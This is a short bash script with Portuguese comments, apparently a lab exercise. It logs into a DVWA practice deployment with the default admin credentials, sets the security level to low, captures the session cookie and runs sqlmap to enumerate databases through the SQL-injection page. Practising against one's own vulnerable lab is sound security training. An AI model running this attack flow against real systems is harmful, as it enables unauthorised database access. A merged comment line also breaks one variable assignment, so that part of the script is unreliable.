#!/bin/bash

# Play 03 — SQLMap DVWA em produção
# Autentica no DVWA e roda sqlmap corretamente, usando --cookie

# Define host DVWA (sem porta)
TARGET_HOST="${DVWA_HOST:-web-dvwa-production.up.railway.app}"
echo "[*] Autenticando no DVWA em http://$TARGET_HOST/login.php..."

# Resolve path do script\SCRIPT_PATH="$(readlink -f "${BASH_SOURCE[0]}")"
SCRIPT_DIR="$(dirname "$SCRIPT_PATH")"
COOKIE_FILE="$SCRIPT_DIR/cookies.txt"

# 1. Login e captura cookies (segue redirect)
curl -s -c "$COOKIE_FILE" -L \
  -d "username=admin&password=password&Login=Login" \
  "http://$TARGET_HOST/login.php" > /dev/null

# 2. Define segurança LOW (usa cookie salvo)
echo "[*] Definindo segurança para LOW..."
curl -s -b "$COOKIE_FILE" -L \
  "http://$TARGET_HOST/security.php?security=low" > /dev/null

# 3. Extrai PHPSESSID do cookie file
PHPSESSID=$(grep -E 'PHPSESSID' "$COOKIE_FILE" | awk '{print $7}')
COOKIE="security=low; PHPSESSID=$PHPSESSID"

echo "[*] Iniciando análise SQL Injection com sqlmap contra http://$TARGET_HOST/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit..."
sqlmap \
  -u "http://$TARGET_HOST/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie "$COOKIE" \
  --batch \
  --level=3 \
  --risk=2 \
  --dbs || true

echo "[✓] Análise SQLi concluída."
